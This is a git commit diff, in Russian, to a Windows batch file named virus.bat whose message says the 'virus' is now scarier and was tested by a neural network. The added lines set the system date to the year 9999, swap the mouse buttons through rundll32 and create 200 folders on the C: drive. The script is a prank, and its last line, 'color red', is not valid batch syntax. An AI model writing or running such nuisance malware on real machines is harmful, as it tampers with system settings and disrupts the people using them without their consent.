9de4b94582692cd612124e2eaff79194e90c2742
hello_world_789 <ilya.seryachenko@ya.ru>
2025-10-04 18:59:27 +0300

    Теперь вирус более страшный (протестировано нейросетью)

--- virus.bat
+++ virus.bat
@@ -1,4 +1,13 @@
-x:
 echo "lol"
 start calc
-goto x
+date 31.12.9999
+%SystemRoot%/system32/rundll32 user32, SwapMouseButton
+md A
+md AB
+setlocal enabledelayedexpansion
+
+for /l %%i in (1,1,200) do (
+    md "C:\Folder%%i"
+)
+
+color red
